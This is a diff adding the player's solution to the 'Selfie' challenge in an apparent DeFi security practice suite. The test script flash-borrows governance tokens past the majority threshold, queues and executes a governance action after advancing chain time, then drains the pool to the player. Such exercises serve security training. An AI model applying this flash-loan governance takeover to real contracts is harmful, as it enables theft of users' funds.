@@ -37,8 +37,62 @@ describe('[Challenge] Selfie', function () {
 
     });
 
+    async function increaseBlockTime(timeInSeconds) {
+        //Increase the block time plus two days
+        // Get the current block number
+        const currentBlockNumber = await ethers.provider.getBlockNumber();
+        console.log("CurrentBlockNumber:", currentBlockNumber);
+
+        await ethers.provider.send("evm_increaseTime", [timeInSeconds]);
+
+        // Mine a new block to update the block timestamp
+        await ethers.provider.send("evm_mine", []);
+
+        // Get the new block number and timestamp
+        const newBlockNumber = await ethers.provider.getBlockNumber();
+        const newBlockTimestamp = (await ethers.provider.getBlock(newBlockNumber)).timestamp;
+
+        console.log("Increased Block Number:", newBlockNumber);
+        console.log("Increased Block Timestamp:", newBlockTimestamp);
+    }
     it.only('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Deploy the borrower
+        let borrower = await (await ethers.getContractFactory('FlashBorrower', deployer)).deploy(
+            pool.address,
+            governance.address,
+            token.address    
+        );
+        console.log("FlashBorrower deployed");
+        const maxReq = (await token.getTotalSupplyAtLastSnapshot()).div(2).add(1);
+        console.log("maxReq: ", maxReq);
+        let balOfBorrower = await token.balanceOf(borrower.address);
+        console.log("balOfBorrower: ", balOfBorrower);
+        while(balOfBorrower.lt(maxReq)) {
+            let amount = maxReq.sub(balOfBorrower);
+            console.log("Amount Borrowing", amount);
+         
+            //queue action
+            await borrower.flashBorrow(token.address, amount);
+            console.log("Queued...");
+
+            // Increase the block time by 2 days (in seconds)
+            const twoDaysInSeconds = 2 * 24 * 60 * 60;
+            await increaseBlockTime(twoDaysInSeconds);            
+
+            //execute action
+            await borrower.flashBorrow(token.address, amount);
+            console.log("Executed...");
+            balOfBorrower = await token.balanceOf(borrower.address);
+            console.log("balOfBorrower: ", balOfBorrower);
+        }
+        console.log("Draining remaining balance........................");
+        await borrower.drainRemainingToken();
+         // Increase the block time by 2 days (in seconds)
+        const twoDaysInSeconds = 2 * 24 * 60 * 60;
+        await increaseBlockTime(twoDaysInSeconds); 
+        await borrower.drainRemainingToken();
+        await borrower.transferBalance(player.address);
     });
 
     after(async function () {
